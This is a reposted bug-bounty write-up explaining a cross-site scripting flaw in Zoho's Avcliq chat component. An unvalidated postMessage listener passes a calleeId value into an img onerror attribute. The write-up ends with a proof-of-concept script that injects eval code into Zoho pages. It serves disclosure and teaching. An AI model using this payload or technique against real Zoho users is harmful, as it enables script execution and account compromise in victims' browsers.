# :globe_with_meridians: Behind the Message: Two Critical XSS Vulnerabilities in Zoho’s Web Applications

> **Original Source:** [Behind the Message: Two Critical XSS Vulnerabilities in Zoho’s Web Applications](https://infosecwriteups.com/behind-the-message-two-critical-xss-vulnerabilities-in-zohos-web-applications-86aa42887129)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## Vulnerability 1: PostMessage XSS in Avcliq


## Overview


Avcliq, Zoho’s embedded team communication framework, includes a chat utility visible as a bottom toolbar. During a security review, a flawed PostMessage listener was identified in the Avcliq script (`[https://static.zohocdn.com/](https://static.zohocdn.com/%E2%80%A6/avcliq-mediacomponents-util-min.2fd86ba3ef859be5613701fde43f76d9.js)../avcliq-mediacomponents-util-min.js`), enabling arbitrary JavaScript execution.

## Technical Breakdown


### 1. Insecure Event Listener (No Origin Validation)


Since there is no origin validation, an attacker can exploit this freely. Let’s analyze `_handleRequest` function


```
window.addEventListener("message", (e) => {
if (typeof e.data === "string") {
try {
const message = JSON.parse(e.data);
if (message.module && message.module === this.MODULE) {
switch (message.type) {
case this.TYPE.request:
this._handleRequest(message, e);
break;
case this.TYPE.response:
...
}
}
}
...
...
```


### 2. Unsanitized Input in MediaCallSession


Here we have a call to `MediaCall.initiateStartCallProcess` and this function will take three parameters from the message `type,calleeId,triggerSource`


let’s analyze `MediaCall.initiateStartCallProcess` .


```
_handleRequest: function (message, event) {
if (message.action && message.reqId) {
let response;
switch (message.action) {
// Other cases...
case this.ACTION.startCall: -> start_call
response = MediaCall.initiateStartCallProcess(
message.params.type,
message.params.calleeId,
undefined,
message.params.triggerSource
);
break;
// Other cases...
}
}
},j
```


We have another call to `MediaCall.initiateCallProcess` and the argument is new instances of the `MediaCallSession` class with the initial arguments `callType` and `calleeId`


```
initiateStartCallProcess: function (callType, calleeId, chatId, triggerSource) {
MediaCall.initiateCallProcess(
new MediaCallSession({
type: callType,
chat_id: chatId,
callee_id: calleeId,
}),
triggerSource
);
},
```


And here is `MediaCallSession `structure


```
{
_id: "outgoingmediacall",
_type: callType,
_connectedTime: -1,
...,
_calleeId: calleeId,
...,
_members: {
xxxxxxxxxx: {
calleeId: {
_id: calleeId,
_type: callType,
...
}
}
}
};
```


Here we have some jumps.


```
initiateCallProcess: function (callSession, param1, param2, param3) {
// ... (Other logic)
MediaCallUI.showCallUI(callSession);
}

showCallUI: function (callSession) {
var uiElement = ZCJQuery(MediaCallTemplates.getMainUIHtml(callSession));
// ...
}

getMainUIHtml: function (callSession) {
// ...
$WC.template.replace(v, {
initial_cnt: n(callSession),
...
});
}
```


### 3. DOM Injection via `user_img_error_event attribute`


The issue occurs in the `user_img_error_event`


```
n = function (callSession) {
// ...
let otherMember = callSession.getOtherMember();
// ...

return $WC.template.replace(d, {
call_state_class: r,
user_name: otherMember.getName() !== undefined ? otherMember.getName() : "",
user_img: MediaCall.BRIDGE.Users.getImgUrlById(otherMember.getId()),
user_img_error_event: `onerror=MediaCallHandler.ImageLoadEvents.onError(this, ${otherMember.getId()})`,
$content: s,
$network_strength_tooltip: "avcliq.network.strength.weak.curruser"
});
};
```


where the value for `onerror` is set using:


```
onerror=MediaCallHandler.ImageLoadEvents.onError(this, l.getId())
```


The interesting part is that `otherMember.getId()`returns the value we passed, which corresponds to `calleeId` in the message. This means we can manipulate the event and inject new syntax.


Let’s examine the output of `$WC.template.replace`:


```
<img class="bdrR100 zc-bdrR100 wh100 zc-wh100"
user_image
src="https://contacts.zoho.com/file?ID=calleeId&amp;t=user&amp;exp=6000&amp;fs=thumb"
onerror=MediaCallHandler.ImageLoadEvents.onError(this,calleeId)>
```


As you can see, our input is added to the `onerror` event without proper filtration, allowing for JavaScript injection


For example`);eval(whateverwewant);(` which will result


```
<img class="bdrR100 zc-bdrR100 wh100 zc-wh100"
user_image
src="https://contacts.zoho.com/file?ID=calleeId&amp;t=user&amp;exp=6000&amp;fs=thumb"
onerror=MediaCallHandler.ImageLoadEvents.onError(this,);eval(whateverwewant);()>
```


Proof Of Concept (POC)


## Get HackerWithOutHat’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


The final payload is


```
<script>
const a = window.open("https://xxxx.zoho.com/");
setTimeout(() => {
a.postMessage(
JSON.stringify({
module: "directcall",
type: 1,
action: "start_call",
reqId: "1",
params: {
type: "x1",
calleeId: "'x2');eval('alert(document.domain)');(''",
triggerSource: "x3"
}
}),
"*"
);
}, 6000);
</script>
```


*Since this JavaScript is embedded across Zoho’s web products, nearly all Zoho applications (*`.zoho.com`, `*.zoho.com.cn*`*) are vulnerable*

---

*Originally published on [Medium](https://infosecwriteups.com/behind-the-message-two-critical-xss-vulnerabilities-in-zohos-web-applications-86aa42887129). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
